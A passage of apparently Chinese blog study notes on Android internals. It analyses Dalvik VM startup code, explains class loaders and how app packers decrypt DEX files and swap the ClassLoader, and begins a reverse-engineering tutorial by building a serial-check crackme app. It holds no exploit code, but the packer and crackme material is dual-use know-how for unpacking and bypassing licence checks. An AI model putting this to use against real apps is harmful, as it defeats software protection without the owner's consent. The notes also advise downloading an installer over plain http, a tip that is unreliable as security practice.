class="literal">NULL</span>);  </span><br><span class="line">assert(gDvm.classJavaLangVMThread != <span class="literal">NULL</span>);  </span><br><span class="line">assert(gDvm.classJavaLangThreadGroup != <span class="literal">NULL</span>);  </span><br><span class="line"><span class="comment">/*     * Make sure these exist.  If they don&#x27;t, we can return a failure out   </span></span><br><span class="line"><span class="comment">* of main and nip the whole thing in the bud.     */</span>   </span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* earlyClasses[] = &#123;      </span><br><span class="line">    <span class="string">&quot;Ljava/lang/InternalError;&quot;</span>,       </span><br><span class="line">    <span class="string">&quot;Ljava/lang/StackOverflowError;&quot;</span>,  </span><br><span class="line">    <span class="string">&quot;Ljava/lang/UnsatisfiedLinkError;&quot;</span>,  </span><br><span class="line">    <span class="string">&quot;Ljava/lang/NoClassDefFoundError;&quot;</span>, </span><br><span class="line">    <span class="literal">NULL</span>    </span><br><span class="line">&#125;;    </span><br><span class="line"><span class="type">const</span> <span class="type">char</span>** pClassName;   </span><br><span class="line"><span class="keyword">for</span> (pClassName = earlyClasses; *pClassName != <span class="literal">NULL</span>; pClassName++) &#123; </span><br><span class="line">    <span class="keyword">if</span> (dvmFindSystemClassNoInit(*pClassName) == <span class="literal">NULL</span>)   </span><br><span class="line">        <span class="keyword">goto</span> fail;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码检查java.lang.Class、java.lang.Object、java.lang.Thread、java.lang.VMThread和java.lang.ThreadGroup这五个核心类经过前面的初始化操作后已经得到加载，并且确保系统中存在java.lang.InternalError、java.lang.StackOverflowError、java.lang.UnsatisfiedLinkError和java.lang.NoClassDefFoundError这四个核心类。 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/*     * Miscellaneous class library validation.     */</span> </span><br><span class="line"><span class="keyword">if</span> (!dvmValidateBoxClasses())    </span><br><span class="line">    <span class="keyword">goto</span> fail;   </span><br><span class="line"><span class="comment">/*     * Do the last bits of Thread struct initialization we need to allow    </span></span><br><span class="line"><span class="comment">* JNI calls to work.     */</span>  </span><br><span class="line"><span class="keyword">if</span> (!dvmPrepMainForJni(pEnv))      </span><br><span class="line">    <span class="keyword">goto</span> fail;   </span><br><span class="line"><span class="comment">/*     * Register the system native methods, which are registered through JNI.     */</span> </span><br><span class="line"><span class="keyword">if</span> (!registerSystemNatives(pEnv))      </span><br><span class="line">    <span class="keyword">goto</span> fail;   </span><br><span class="line"><span class="comment">/*     * Do some &quot;late&quot; initialization for the memory allocator.  This may     * allocate storage and initialize classes.     */</span>   </span><br><span class="line"><span class="keyword">if</span> (!dvmCreateStockExceptions())       </span><br><span class="line">    <span class="keyword">goto</span> fail;   </span><br><span class="line"><span class="comment">/*     * At this point, the VM is in a pretty good state.  Finish prep on  </span></span><br><span class="line"><span class="comment">* the main thread (specifically, create a java.lang.Thread object to go  </span></span><br><span class="line"><span class="comment">* along with our Thread struct).  Note we will probably be executing    </span></span><br><span class="line"><span class="comment">* some interpreted class initializer code in here.     */</span> </span><br><span class="line"><span class="keyword">if</span> (!dvmPrepMainThread())       </span><br><span class="line">    <span class="keyword">goto</span> fail;    </span><br><span class="line"><span class="comment">/*     * Make sure we haven&#x27;t accumulated any tracked references.  The main    </span></span><br><span class="line"><span class="comment">* thread should be starting with a clean slate.     */</span>   </span><br><span class="line"><span class="keyword">if</span> (dvmReferenceTableEntries(&amp;dvmThreadSelf()-&gt;internalLocalRefTable) != <span class="number">0</span>)    &#123; </span><br><span class="line">    LOGW(<span class="string">&quot;Warning: tracked references remain post-initialization\n&quot;</span>); </span><br><span class="line">    dvmDumpReferenceTable(&amp;dvmThreadSelf()-&gt;internalLocalRefTable, <span class="string">&quot;MAIN&quot;</span>);</span><br><span class="line">&#125;    </span><br><span class="line"><span class="comment">/* general debugging setup */</span>    </span><br><span class="line"><span class="keyword">if</span> (!dvmDebuggerStartup())  </span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br></pre></td></tr></table></figure><p>这段代码继续执行其它函数来执行其它的初始化和检查工作。</p><p>上述初始化和检查操作执行完成之后，我们再来看最后一段代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*     * Init for either zygote mode or non-zygote mode.  The key difference   </span></span><br><span class="line"><span class="comment">  * is that we don&#x27;t start any additional threads in Zygote mode.     */</span>   </span><br><span class="line"><span class="keyword">if</span> (gDvm.zygote) &#123;   </span><br><span class="line">    <span class="keyword">if</span> (!dvmInitZygote())        </span><br><span class="line">        <span class="keyword">goto</span> fail;    </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">if</span> (!dvmInitAfterZygote())    </span><br><span class="line">        <span class="keyword">goto</span> fail;  </span><br><span class="line">&#125;    </span><br><span class="line">......    </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">fail:   </span><br><span class="line">dvmShutdown();  </span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码完成Dalvik虚拟机的最后一步初始化工作。它检查Dalvik虚拟机是否指定了-Xzygote启动选项。如果指定了的话，那么就说明当前是在Zygote进程中启动Dalvik虚拟机，因此，接下来就会调用函数<code>dvmInitZygote()</code>来执行最后一步初始化工作。否则的话，就会调用另外一个函数<code>dvmInitAfterZygote()</code>来执行最后一步初始化工作。 </p><h4 id="1-2-1-6-dvmInitZygote"><a href="#1-2-1-6-dvmInitZygote" class="headerlink" title="1.2.1.6 dvmInitZygote()"></a>1.2.1.6 dvmInitZygote()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* * Do zygote-mode-only initialization. */</span></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">dvmInitZygote</span><span class="params">(<span class="type">void</span>)</span>&#123;   </span><br><span class="line">    <span class="comment">/* zygote goes into its own process group */</span>   </span><br><span class="line">    setpgid(<span class="number">0</span>,<span class="number">0</span>);  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数<code>dvmInitZygote()</code>的实现很简单，它只是调用了系统调用<code>setpgid()</code>来设置当前进程，即Zygote进程的进程组ID。注意，在调用<code>setpgid()</code>的时候，传递进去的两个参数均为0，这意味着Zygote进程的进程组ID与进程ID是相同的，也就是说，Zygote进程运行在一个单独的进程组里面。</p><p>这一步执行完成之后，Dalvik虚拟机的创建和初始化工作就完成了，回到前面的第1步中，即AndroidRuntime类的成员函数<code>start()</code>中，接下来就会调用AndroidRuntime类的另外一个成员函数<code>startReg()</code>来注册Android核心类的JNI方法。</p><h4 id="1-2-1-7-AndroidRuntime-startReg"><a href="#1-2-1-7-AndroidRuntime-startReg" class="headerlink" title="1.2.1.7 AndroidRuntime.startReg()"></a>1.2.1.7 AndroidRuntime.startReg()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* * Register android native functions with the VM. */</span></span><br><span class="line"><span class="comment">/*static*/</span> </span><br><span class="line"><span class="type">int</span> <span class="title function_">AndroidRuntime::startReg</span><span class="params">(JNIEnv* env)</span>&#123; </span><br><span class="line">    <span class="comment">/*     * This hook causes all future threads created in this process to be    </span></span><br><span class="line"><span class="comment">    * attached to the JavaVM.  (This needs to go away in favor of JNI   </span></span><br><span class="line"><span class="comment">    * Attach calls.)     */</span>    </span><br><span class="line">    androidSetCreateThreadFunc((android_create_thread_fn) javaCreateThreadEtc); </span><br><span class="line">    LOGV(<span class="string">&quot;--- registering native functions ---\n&quot;</span>);  </span><br><span class="line">    <span class="comment">/*     * Every &quot;register&quot; function calls one or more things that return  </span></span><br><span class="line"><span class="comment">    * a local reference (e.g. FindClass).  Because we haven&#x27;t really    </span></span><br><span class="line"><span class="comment">    * started the VM yet, they&#x27;re all getting stored in the base frame  </span></span><br><span class="line"><span class="comment">    * and never released.  Use Push/Pop to manage the storage.     */</span>  </span><br><span class="line">    env-&gt;PushLocalFrame(<span class="number">200</span>);   </span><br><span class="line">    <span class="keyword">if</span> (register_jni_procs(gRegJNI, NELEM(gRegJNI), env) &lt; <span class="number">0</span>) &#123; </span><br><span class="line">        env-&gt;PopLocalFrame(<span class="literal">NULL</span>);     </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    env-&gt;PopLocalFrame(<span class="literal">NULL</span>);    </span><br><span class="line">    <span class="comment">//createJavaThread(&quot;fubar&quot;, quickTest, (void*) &quot;hello&quot;);  </span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AndroidRuntime类的成员函数<code>startReg()</code>首先调用函数<code>androidSetCreateThreadFunc()</code>来设置一个线程创建钩子javaCreateThreadEtc。这个线程创建钩子是用来初始化一个Native线程的JNI环境的，也就是说，当我们在C++代码中创建一个Native线程的时候，函数<code>javaCreateThreadEtc()</code>会被调用来初始化该Native线程的JNI环境。后面在分析Dalvik虚拟机线程的创建过程时，我们再详细分析函数<code>javaCreateThreadEtc()</code>的实现。</p><p>AndroidRuntime类的成员函数<code>startReg()</code>接着调用函数<code>register_jni_procs()</code>来注册Android核心类的JNI方法。在注册JNI方法的过程中，需要在Native代码中引用到一些Java对象，这些Java对象引用需要记录在当前线程的一个Native堆栈中。但是此时Dalvik虚拟机还没有真正运行起来，也就是当前线程的Native堆栈还没有准备就绪。在这种情况下，就需要在注册JNI方法之前，手动地将在当前线程的Native堆栈中压入一个帧（Frame），并且在注册JNI方法之后，手动地将该帧弹出来。</p><p>当前线程的JNI环境是由参数env所指向的一个JNIEnv对象来描述的，通过调用它的成员函数<code>PushLocalFrame()</code>和<code>PopLocalFrame()</code>就可以手动地往当前线程的Native堆栈压入和弹出一个帧。注意，这个帧是一个本地帧，只可以用来保存Java对象在Native代码中的本地引用。</p><p>函数<code>register_jni_procs()</code>的实现如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">register_jni_procs</span><span class="params">(<span class="type">const</span> RegJNIRec <span class="built_in">array</span>[], <span class="type">size_t</span> count, JNIEnv* env)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">array</span>[i].mProc(env) &lt; <span class="number">0</span>) &#123;   </span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;     </span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从前面的调用过程可以知道，参数array指向的是全局变量gRegJNI所描述的一个JNI方法注册函数表，其中，每一个表项都用一个RegJNIRec对象来描述，而每一个RegJNIRec对象都有一个成员变量mProc，指向一个JNI方法注册函数。通过依次调用这些注册函数，就可以将Android核心类的JNI方法注册到前面的所创建的Dalvik虚拟机中去。</p><p>回到AndroidRuntime类的成员函数<code>startReg()</code>中，接下来我们就继续分析函数<code>androidSetCreateThreadFunc()</code>的实现，以便可以了解线程创建钩子javaCreateThreadEtc的注册过程。</p><h4 id="1-2-1-8-androidSetCreateThreadFunc"><a href="#1-2-1-8-androidSetCreateThreadFunc" class="headerlink" title="1.2.1.8 androidSetCreateThreadFunc()"></a>1.2.1.8 androidSetCreateThreadFunc()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> android_create_thread_fn gCreateThreadFn = androidCreateRawThreadEtc;</span><br><span class="line">......</span><br><span class="line"><span class="type">void</span> <span class="title function_">androidSetCreateThreadFunc</span><span class="params">(android_create_thread_fn func)</span>&#123;  </span><br><span class="line">    gCreateThreadFn = func;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从这里就可以看到，线程创建钩子javaCreateThreadEtc被保存在一个函数指针gCreateThreadFn中。注意，函数指针gCreateThreadFn默认是指向函数<code>androidCreateRawThreadEtc()</code>的，也就是说，如果我们不设置线程创建钩子的话，函数<code>androidCreateRawThreadEtc()</code>就是默认使用的线程创建函数。后面在分析Dalvik虚拟机线程的创建过程时，我们再详细分析函数指针gCreateThreadFn是如何使用的。</p><h4 id="1-2-1-9-总结"><a href="#1-2-1-9-总结" class="headerlink" title="1.2.1.9 总结"></a>1.2.1.9 总结</h4><p>至此，我们就分析完成Dalvik虚拟机在Zygote进程中的启动过程，这个启动过程主要就是完成了以下四件事情：</p><ol><li>创建了一个Dalvik虚拟机实例；</li><li>加载了Java核心类及其JNI方法；</li><li>为主线程设置了一个JNI环境；</li><li>注册了Android核心类的JNI方法。</li></ol><p>换句话说，就是Zygote进程为Android系统准备好了一个Dalvik虚拟机实例，以后Zygote进程在创建Android应用程序进程的时候，就可以将它自身的Dalvik虚拟机实例复制到新创建Android应用程序进程中去，从而加快了Android应用程序进程的启动过程。此外，Java核心类和Android核心类（位于DEX文件中），以及它们的JNI方法（位于so文件中），都是以内存映射的方式来读取的，因此，Zygote进程在创建Android应用程序进程的时候，除了可以将自身的Dalvik虚拟机实例复制到新创建的Android应用程序进程之外，还可以与新创建的Android应用程序进程共享Java核心类和Android核心类，以及它们的JNI方法，这样就可以节省内存消耗。</p><p>同时，Zygote进程为了加快Android应用程序进程的启动过程，牺牲了自己的启动速度，因为它需要加载大量的Java核心类，以及注册大量的Android核心类JNI方法。Dalvik虚拟机在加载Java核心类的时候，还需要对它们进行验证以及优化，这些通常都是比较耗时的。又由于Zygote进程是由init进程启动的，也就是说Zygote进程在是开机的时候进行启动的，因此，Zygote进程的牺牲是比较大的。不过毕竟我们在玩手机的时候，很少会关机，也就是很少开机，因此，牺牲Zygote进程的启动速度是值得的，换来的是Android应用程序的快速启动。而且，Android系统为了加快Java类的加载速度，还会想方设法地提前对DEX文件进行验证和优化。</p><h3 id="1-2-2-Android基本类预加载"><a href="#1-2-2-Android基本类预加载" class="headerlink" title="1.2.2 Android基本类预加载"></a>1.2.2 Android基本类预加载</h3><p>Android中的ClassLoader类型分为系统ClassLoader和自定义ClassLoader。其中系统ClassLoader包括3种，分别是BootClassLoader、DexClassLoader、PathClassLoader。</p><p>(1)BootClassLoader：Android平台上所有Android系统启动时会使用BootClassLoader来预加载常用的类。<br>(2)BaseDexClassLoader：实际应用层类文件的加载，而真正的加载委托给pathList来完成。<br>(3)DexClassLoader：可以加载DEX文件以及包含DEX的压缩文件(APK, DEX, JAR, ZIP)，可以加载一个未安装的APK文件的DEX文件，一般为自定义类加载器。<br>(4)PathClassLoader：可以加载系统类和应用程序的类，通常用来加载已安装的APK的DEX文件。</p><img src="/posts/f504c8a5/1.2.3.png" class="" title="Android类加载详细流程"><h1 id="2-壳的动态加载及修复流程"><a href="#2-壳的动态加载及修复流程" class="headerlink" title="2. 壳的动态加载及修复流程"></a>2. 壳的动态加载及修复流程</h1><h2 id="2-1-App启动流程"><a href="#2-1-App启动流程" class="headerlink" title="2.1 App启动流程"></a>2.1 App启动流程</h2><ol><li>BootClassLoader加载系统核心库</li><li>PathClassLoader加载App自身DEX</li><li>进入App自身组件开始执行</li><li>调用声明Application的attachBaseContext</li><li>调用声明Application的onCreate</li></ol><img src="/posts/f504c8a5/2.1.1.png" class="" title="App启动流程"><h2 id="2-2-加壳应用的启动流程"><a href="#2-2-加壳应用的启动流程" class="headerlink" title="2.2 加壳应用的启动流程"></a>2.2 加壳应用的启动流程</h2><img src="/posts/f504c8a5/2.2.1.png" class="" title="加壳应用的启动流程"><p>壳要做的工作有：</p><ol><li>对原先App的DEX进行解密</li><li>初始化自定义类加载器</li><li>替换LoadApk中的加载器为自定义加载器</li></ol><p>在这个启动流程有两个问题需要解决：</p><ol><li>何时进行DEX的解密？在自定义Application的attachBaseContext方法中进行解密。</li><li>如何解决动态加载的DEX中的类的生命周期问题？在自定义Application的onCreate方法中实现。</li></ol><h2 id="2-3-生命周期类处理"><a href="#2-3-生命周期类处理" class="headerlink" title="2.3 生命周期类处理"></a>2.3 生命周期类处理</h2><p>DexClassLoader加载的类是没有组件生命周期的，也就是说即使DexClassLoader通过对APK的动态加载完成了对组件类的加载，当系统启动该组件时，依然会出现加载类失败的异常。为什么呢？</p><p>因为Activity不像函数方法，Activity具有生命周期和相关组件信息，只有当ClassLoader被修正后，才能正确加载被解密后的DEX类和方法。</p><p>ClassLoader修正的两种解决方案：</p><ul><li>通过层层反射，拿到mPackage内容，然后根据包名通过LoadApk获取App内的类加载器，最终使用自定义类加载器进行替换。</li></ul><img src="/posts/f504c8a5/2.2.2.png" class="" title="方法一"><ul><li>利用双亲委派机制，在BootClassloader和PathClassloader中插入我们自定义的类加载器，完成修复。</li></ul><img src="/posts/f504c8a5/2.2.3.png" class="" title="方法二"><p>方法一是加壳厂商经常会用的方式，也就是通过自定义DexClassLoader对原先的类加载器进行替换修复。</p><p>这里还分为两种情况：</p><ul><li>一种是原始的App没有自定义Application子类，那么这种情况比较简单，直接替换壳的Application即可。</li><li>另一种情况，是原始App定义了Application子类，那么壳Application的工作就不仅仅是进行解密、类加载器修复等工作了，还有对解密后的DEX原始的Application的方法和类重新进行处理，保证整个过程运行顺畅。</li></ul><p>我们可以看<code>AndroidManifest.xml</code>内的主Application是否被替换为壳Application入口，同时观察壳Application的汇编代码，会发现进行了大量的修复。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;类加载器与动态加载是学习Android加壳与脱壳的需要。&lt;/p&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Android软件安全与逆向分析</title>
    <link href="http://example.com/posts/d368aa06.html"/>
    <id>http://example.com/posts/d368aa06.html</id>
    <published>2022-07-31T08:30:47.469Z</published>
    <updated>2022-11-17T06:36:33.914Z</updated>
    
    <content type="html"><![CDATA[<p>这篇笔记是学习看雪“非虫”的《Android软件安全与逆向分析》一书中的内容所写。</p><span id="more"></span><h1 id="1-Windows下环境搭建"><a href="#1-Windows下环境搭建" class="headerlink" title="1. Windows下环境搭建"></a>1. Windows下环境搭建</h1><h2 id="1-1-安装JDK"><a href="#1-1-安装JDK" class="headerlink" title="1.1 安装JDK"></a>1.1 安装JDK</h2><p><a href="https://www.oracle.com/java/technologies/downloads/">https://www.oracle.com/java/technologies/downloads/</a></p><p>一定一定要安装Java8，我被其他版本搞死了。安装完成后，在CMD窗口输入以下三条命令，都有信息出来则表明安装成功：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java</span><br><span class="line">javac</span><br><span class="line">javap</span><br></pre></td></tr></table></figure><h2 id="1-2-安装Android-SDK"><a href="#1-2-安装Android-SDK" class="headerlink" title="1.2 安装Android SDK"></a>1.2 安装Android SDK</h2><p><a href="https://dl.google.com/android/installer_r24.4.1-windows.exe">https://dl.google.com/android/installer_r24.4.1-windows.exe</a></p><p>SDK要放在没有空格的路径中，否则在配置Android Studio时会报错。安装完成后，“以管理员身份运行”android-sdk目录下的<code>SDK Manager.exe</code>，为了方便后续操作，安卓系统选择Android 9(API 28)，其余默认安装就好。安装完成后该目录下会多出来很多文件夹，将tools文件夹和platform-tools文件夹添加到系统的PATH环境变量中。</p><p>在CMD窗口输入以下两条命令，都有信息出来则表明安装成功：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">emulator -version</span><br><span class="line">adb version</span><br></pre></td></tr></table></figure><p>如果输入第一条命令后显示如下错误，说明已经安装，提示是说命令格式不对。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\v5le0n9&gt;emulator -version</span><br><span class="line">emulator: ERROR: No AVD specified. Use &#x27;@foo&#x27; or &#x27;-avd foo&#x27; to launch a virtual device named &#x27;foo&#x27;</span><br></pre></td></tr></table></figure><h2 id="1-3-安装Android-NDK"><a href="#1-3-安装Android-NDK" class="headerlink" title="1.3 安装Android NDK"></a>1.3 安装Android NDK</h2><p><a href="https://dl.google.com/android/repository/android-ndk-r25-windows.zip">https://dl.google.com/android/repository/android-ndk-r25-windows.zip</a></p><p>傻瓜式操作，最好也不要放在有空格的路径中。</p><h2 id="1-4-安装Android-Studio"><a href="#1-4-安装Android-Studio" class="headerlink" title="1.4 安装Android Studio"></a>1.4 安装Android Studio</h2><p><a href="http://redirector.gvt1.com/edgedl/android/studio/install/2021.1.1.22/android-studio-2021.1.1.22-windows.exe">http://redirector.gvt1.com/edgedl/android/studio/install/2021.1.1.22/android-studio-2021.1.1.22-windows.exe</a></p><p>在官网下载将https修改为http即可下载，否则会一直打不开页面。</p><h1 id="2-分析Android程序"><a href="#2-分析Android程序" class="headerlink" title="2. 分析Android程序"></a>2. 分析Android程序</h1><h2 id="2-1-编写Android程序"><a href="#2-1-编写Android程序" class="headerlink" title="2.1 编写Android程序"></a>2.1 编写Android程序</h2><p>使用Android Studio创建一个Empty Activity，命名为crackme。</p><p>首先设计显示界面。打开工程的<code>activity_main.xml</code>布局文件，添加用户名与注册码编辑框。</p><img src="/posts/d368aa06/2.1.1.png" class="" title="设计界面"><p>接着编写<code>MainActivity.java</code>，将注册的核心算法设计好，输入框与用户输入连接起来。在<code>MainActivity</code>类中添加一个<code>checkSN()</code>方法，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">checkSN</span><span class="params">(String username, String sn)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((username == <span class="literal">null</span>) || (username.length() == <span class="number">0</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>((sn == <span class="literal">null</span>) || (sn.length() != <span class="number">16</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">MessageDigest</span> <span class="variable">digest</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);<span class="comment">//返回实现MD5摘要算法的 MessageDigest 对象</span></span><br><span class="line">        digest.reset();<span class="comment">//将待摘要数据重置，即初始化</span></span><br><span class="line">        digest.update(username.getBytes());<span class="comment">//将username转化为字节数组，作为待摘要数据</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = digest.digest();<span class="comment">//执行摘要算法，结果存入字节数组</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : bytes)</span><br><span class="line">        &#123;<span class="comment">//从字节数组中依次取出1个字节</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">hexstr</span> <span class="operator">=</span> Integer.toHexString(b &amp; <span class="number">0xff</span>);<span class="comment">//将每个字节转化为十六进制字符串</span></span><br><span class="line">            <span class="keyword">if</span> (hexstr.length() == <span class="number">1</span>)</span><br><span class="line">            &#123;<span class="comment">//如果得出的结果长度为1，则在前面加0，保证每个字节转字符串后加入序列时是两个字符</span></span><br><span class="line">                hexstr = <span class="string">&quot;0&quot;</span> + hexstr;</span><br><span class="line">            &#125;</span><br><span class="line">            sb1.append(hexstr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;sb1.length(); i+=<span class="number">2</span>)</span><br><span class="line">            sb2.append(sb1.charAt(i));<span class="comment">//将摘要的奇位数作为sn</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">userSN</span> <span class="operator">=</span> sb2.toString();</span><br><span class="line">        <span class="keyword">if</span>(!userSN.equalsIgnoreCase(sn))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(NoSuchAlgorithmException e)</span><br><span class="line">    &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>MessageDigest 类为应用程序提供信息摘要算法的功能，如 MD5 或 SHA 算法。信息摘要是安全的单向哈希函数，它接收任意大小的数据，并输出固定长度的哈希值。MessageDigest 对象开始被初始化，该对象通过使用 update() 方法处理数据。任何时候都可以调用 reset() 方法重置摘要。一旦所有需要更新的数据都已经被更新了，应该调用 digest() 方法之一完成哈希计算。对于给定数量的更新数据，digest() 方法只能被调用一次。在调用 digest() 之后，MessageDigest 对象被重新设置成其初始状态。</p><p>在 StringBuilder 上的主要操作是 append() 和 insert() 方法。每个方法都能有效地将给定的数据转换成字符串，然后将该字符串的字符添加或插入到字符串生成器中。由于 StringBuilder 相较于 StringBuffer 有速度优势，所以多数情况下建议使用 StringBuilder 类。然而在应用程序要求线程安全的情况下，则必须使用 StringBuffer 类。它们原理一样。</p><p>charAt(int index)方法是一个能够用来检索特定索引下的字符的String实例的方法。</p></blockquote><p>在<code>OnCreate()</code>方法中加入注册按钮点击事件的监听器，如果用户名与注册码匹配就弹出注册成功的提示，不匹配则提示无效的用户名或注册码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    setTitle(R.string.unregister);</span><br><span class="line">    <span class="type">EditText</span> <span class="variable">edit_username</span> <span class="operator">=</span> (EditText) findViewById(R.id.editTextTextPersonName);</span><br><span class="line">    <span class="type">EditText</span> <span class="variable">edit_sn</span> 